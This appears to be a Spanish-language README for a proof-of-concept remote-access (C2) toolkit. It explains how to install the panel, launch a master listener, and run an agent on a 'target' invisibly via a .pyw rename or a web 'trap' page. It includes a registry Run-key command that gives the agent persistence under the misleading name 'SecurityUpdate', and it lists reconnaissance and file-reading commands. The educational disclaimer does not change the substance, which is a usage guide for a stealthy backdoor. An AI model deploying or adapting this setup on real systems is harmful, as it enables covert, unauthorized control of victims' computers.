🛡️ Network Shield - Remote Administration System (PoC)
Este proyecto es una Prueba de Concepto (PoC) diseñada para estudiar el funcionamiento de los sistemas de administración remota (C2) y las técnicas de persistencia en entornos Windows.

⚠️ AVISO LEGAL: Este software ha sido creado exclusivamente con fines educativos y de investigación en ciberseguridad. El autor no se hace responsable del mal uso de este código.

🛠️ Requisitos del Sistema
XAMPP: Servidor Apache y MySQL (MariaDB).

Python 3.x: Instalado en el PATH.

Librerías: Ejecuta pip install requests en tu terminal.

Base de Datos: Importar el esquema incluido en server/db.txt.

🚀 Guía de Instalación y Configuración
1. Preparación de la Base de Datos
Inicia Apache y MySQL desde el panel de XAMPP.

Accede a http://localhost/phpmyadmin.

Crea una base de datos llamada network_shield_db.

Importa el contenido de server/db.txt en la pestaña SQL.

2. Configuración del Servidor Web
Mueve la carpeta Network-Shield-System a C:\xampp\htdocs\.

El panel será accesible en: http://localhost/Network-Shield-System/server/index.php.

📡 Ejecución y Pruebas
🟢 Paso 1: Iniciar el Receptor (Master)
Abre una terminal en la carpeta master/ y lanza el centro de control:

Bash

python receptor.py
🔵 Paso 2: Lanzar el Agente (Client)
Modo Manual: python client/agente.py

Modo Invisible: Renombra a agente.pyw y ejecútalo.

Simulación Web: Accede a http://localhost/Network-Shield-System/server/trampa.php

🔐 Implementación de Persistencia
1️⃣ Instalación (Crear Registro)
DOS

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "pythonw.exe C:\xampp\htdocs\Network-Shield-System\client\agente.pyw" /f
2️⃣ Comprobación (Verificar Estado)
DOS

reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate"
3️⃣ Eliminación (Limpieza)
DOS

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f
📂 Estructura del Repositorio
server/: Panel de control web y base de datos.

client/: Script que se ejecuta en el objetivo.

master/: Terminal C2 interactiva para el administrador.

📋 Comandos de Auditoría Disponibles
💻 Sistema: whoami, systeminfo, tasklist, ipconfig.

📂 Archivos: dir, cd .., type archivo.txt.

🌐 Remoto: start https://google.com, msg * "Acceso detectado".

🚪 Sesión: exit (Cierra la conexión de forma segura).

🛠️ Solución de Problemas (Troubleshooting)
Error de Conexión: Verifica que el puerto 4444 esté abierto en el Firewall de Windows.

Agente invisible: Asegúrate de que la URL en agente.py sea correcta.

Error de MySQL: Verifica que el usuario sea root y la base de datos exista.
